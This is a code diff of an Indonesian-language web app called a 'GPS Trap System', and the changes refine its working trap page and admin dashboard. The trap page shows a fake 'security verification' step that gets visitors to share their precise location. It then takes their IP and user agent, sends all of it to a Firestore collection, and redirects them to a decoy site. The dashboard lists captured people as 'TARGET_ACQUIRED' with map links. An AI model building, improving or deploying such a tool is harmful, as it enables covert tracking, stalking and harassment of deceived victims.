@@ -1,4 +1,4 @@
-    <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
@@ -30,7 +30,7 @@
                     <p class="text-[10px] text-gray-500 uppercase">Real-Time Intelligence & GPS Trap System</p>
                 </div>
                 <div class="flex gap-2">
-                    <div class="glass px-4 py-2 rounded text-[9px]">DB: <span id="db-status" class="text-yellow-500">OFFLINE</span></div>
+                    <div class="glass px-4 py-2 rounded text-[9px]">DB: <span id="db-status" class="text-yellow-500">CONNECTING...</span></div>
                     <div class="glass px-4 py-2 rounded text-[9px]">TARGETS: <span id="target-count" class="text-red-500">0</span></div>
                 </div>
             </header>
@@ -103,10 +103,10 @@
     <!-- FIREBASE & LOGIC -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-        import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getFirestore, collection, addDoc, onSnapshot, query, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        // Global State & Safe Firebase Config Handling
+        // Konfigurasi Dasar
         let firebaseConfig = {};
         try {
             firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {};
@@ -123,21 +123,7 @@
         const urlParams = new URLSearchParams(window.location.search);
         const isTrapMode = urlParams.get('view') === 'trap';
 
-        // 1. AUTHENTICATION
-        const initAuth = async () => {
-            try {
-                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                    await signInWithCustomToken(auth, __initial_auth_token);
-                } else {
-                    await signInAnonymously(auth);
-                }
-            } catch (err) {
-                console.error("Auth Error:", err);
-                document.getElementById('db-status').innerText = "AUTH ERROR";
-            }
-        };
-
-        // UI ACTIONS - Mendaftarkan ke window agar bisa diakses onclick
+        // --- EXPORT KE GLOBAL AGAR BISA DIKLIK (SOLUSI MASALAH KLIK) ---
         window.switchTab = (id) => {
             document.querySelectorAll('.tab-pane').forEach(p => p.classList.add('hidden'));
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
@@ -173,7 +159,7 @@
 
             const apiKey = ""; 
             if(!apiKey) {
-                chat.innerHTML += `<div class="text-red-500 mt-1">MAZKI> [ERROR] API_KEY_MISSING. Silahkan hubungi admin.</div>`;
+                chat.innerHTML += `<div class="text-red-500 mt-1">MAZKI> [ERROR] API_KEY_MISSING.</div>`;
                 return;
             }
 
@@ -183,19 +169,38 @@
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         contents: [{ parts: [{ text: text }] }],
-                        systemInstruction: { parts: [{ text: "Analisis koordinat/IP sebagai pakar keamanan siber." }] }
+                        systemInstruction: { parts: [{ text: "Analisis koordinat sebagai pakar siber." }] }
                     })
                 });
                 const json = await resp.json();
-                const response = json.candidates[0].content.parts[0].text;
+                const response = json.candidates?.[0]?.content?.parts?.[0]?.text || "No response";
                 chat.innerHTML += `<div class="text-green-500 mt-1">MAZKI> ${response}</div>`;
             } catch(e) {
-                chat.innerHTML += `<div class="text-red-500 mt-1">MAZKI> [ERROR] Gagal menghubungi AI.</div>`;
+                chat.innerHTML += `<div class="text-red-500 mt-1">MAZKI> [ERROR] Uplink failed.</div>`;
             }
             chat.scrollTop = chat.scrollHeight;
         };
 
-        // STARTUP
+        // --- AUTH & DB LOGIC ---
+        const initAuth = async (retries = 5) => {
+            for (let i = 0; i < retries; i++) {
+                try {
+                    if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                        await signInWithCustomToken(auth, __initial_auth_token);
+                    } else {
+                        await signInAnonymously(auth);
+                    }
+                    return; // Berhasil
+                } catch (err) {
+                    if (i === retries - 1) {
+                        document.getElementById('db-status').innerText = "AUTH ERROR";
+                        console.error("Auth failed after retries", err);
+                    }
+                    await new Promise(r => setTimeout(r, 1000 * Math.pow(2, i))); // Exponential backoff
+                }
+            }
+        };
+
         initAuth();
 
         onAuthStateChanged(auth, (user) => {
@@ -204,7 +209,7 @@
                 const statusEl = document.getElementById('db-status');
                 if(statusEl) {
                     statusEl.innerText = "ONLINE";
-                    statusEl.className = "text-green-500";
+                    statusEl.className = "text-green-500 font-bold";
                 }
                 
                 if (isTrapMode) {
@@ -212,6 +217,8 @@
                 } else {
                     initAdminDashboard();
                 }
+            } else {
+                document.getElementById('db-status').innerText = "OFFLINE";
             }
         });
 
@@ -220,6 +227,7 @@
             const trapInput = document.getElementById('trap-url');
             if(trapInput) trapInput.value = `${currentUrl}?view=trap`;
             
+            // Path sesuai Rule Firestore
             const colPath = ['artifacts', appId, 'public', 'data', 'traps'];
             const colRef = collection(db, ...colPath);
             const q = query(colRef);
@@ -232,10 +240,11 @@
                 if(count) count.innerText = snapshot.docs.length;
 
                 if (snapshot.empty) {
-                    if(feed) feed.innerHTML = `<div class="text-gray-700 italic">Menunggu koneksi masuk...</div>`;
+                    if(feed) feed.innerHTML = `<div class="text-gray-700 italic">Menunggu target masuk...</div>`;
                     return;
                 }
 
+                // Sort manual (memory) untuk menghindari index error
                 const dataList = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                 dataList.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
 
@@ -244,23 +253,28 @@
                     dataList.forEach(data => {
                         const date = data.timestamp?.toDate().toLocaleString() || "Syncing...";
                         const el = document.createElement('div');
-                        el.className = "p-3 border-b border-gray-900 hover:bg-white/5 transition";
+                        el.className = "p-3 border-b border-gray-900 hover:bg-white/5 transition mb-2 glass rounded";
                         el.innerHTML = `
                             <div class="flex justify-between items-start mb-1">
-                                <span class="text-red-500 font-bold">[CAPTURE_DETECTED]</span>
+                                <span class="text-red-500 font-bold text-[10px]">[!] TARGET_ACQUIRED</span>
                                 <span class="text-gray-600 text-[9px]">${date}</span>
                             </div>
-                            <div class="grid grid-cols-2 text-[10px] gap-1">
-                                <div><span class="text-gray-500">IP:</span> ${data.ip || 'Unknown'}</div>
+                            <div class="grid grid-cols-2 text-[10px] gap-2">
+                                <div><span class="text-gray-500">IP:</span> ${data.ip || 'N/A'}</div>
                                 <div><span class="text-gray-500">ACC:</span> ${data.accuracy ? data.accuracy.toFixed(1) + 'm' : 'N/A'}</div>
-                                <div class="col-span-2"><span class="text-gray-500">LOC:</span> <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="text-blue-500 underline">BUKA DI GOOGLE MAPS</a></div>
+                                <div class="col-span-2 mt-1">
+                                    <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" 
+                                       class="bg-blue-900/30 text-blue-400 px-2 py-1 rounded inline-block border border-blue-900">
+                                       VIEW ON MAPS →
+                                    </a>
+                                </div>
                             </div>
                         `;
                         feed.appendChild(el);
                     });
                 }
             }, (error) => {
-                console.error("Firestore Error:", error);
+                console.error("Monitor Error:", error);
             });
         }
 
@@ -269,36 +283,42 @@
             document.getElementById('trap-page').classList.remove('hidden');
             document.body.style.backgroundColor = "white";
 
-            document.getElementById('btn-verify').onclick = () => {
-                if (!currentUser) return;
+            const btnVerify = document.getElementById('btn-verify');
+            if(btnVerify) {
+                btnVerify.onclick = () => {
+                    if (!currentUser) {
+                        alert("Sistem belum siap. Tunggu status DB ONLINE.");
+                        return;
+                    }
 
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(async (pos) => {
-                        let ip = "Unknown";
-                        try { 
-                            const res = await fetch('https://api.ipify.org?format=json');
-                            const json = await res.json();
-                            ip = json.ip;
-                        } catch(e) {}
+                    if ("geolocation" in navigator) {
+                        navigator.geolocation.getCurrentPosition(async (pos) => {
+                            let ip = "Checking...";
+                            try { 
+                                const res = await fetch('https://api.ipify.org?format=json');
+                                const json = await res.json();
+                                ip = json.ip;
+                            } catch(e) {}
 
-                        try {
-                            const colPath = ['artifacts', appId, 'public', 'data', 'traps'];
-                            await addDoc(collection(db, ...colPath), {
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                ip: ip,
-                                ua: navigator.userAgent,
-                                timestamp: serverTimestamp()
-                            });
-                            const redirect = document.getElementById('redirect-input').value || "https://www.google.com";
-                            window.location.href = redirect;
-                        } catch (err) { console.error(err); }
-                    }, (err) => {
-                        alert("Mohon izinkan akses lokasi untuk melanjutkan.");
-                    }, { enableHighAccuracy: true });
-                }
-            };
+                            try {
+                                const colPath = ['artifacts', appId, 'public', 'data', 'traps'];
+                                await addDoc(collection(db, ...colPath), {
+                                    lat: pos.coords.latitude,
+                                    lon: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy,
+                                    ip: ip,
+                                    ua: navigator.userAgent,
+                                    timestamp: serverTimestamp()
+                                });
+                                const redirect = document.getElementById('redirect-input').value || "https://www.google.com";
+                                window.location.href = redirect;
+                            } catch (err) { console.error(err); }
+                        }, (err) => {
+                            alert("Izin lokasi diperlukan untuk verifikasi keamanan.");
+                        }, { enableHighAccuracy: true });
+                    }
+                };
+            }
         }
     </script>
 </body>
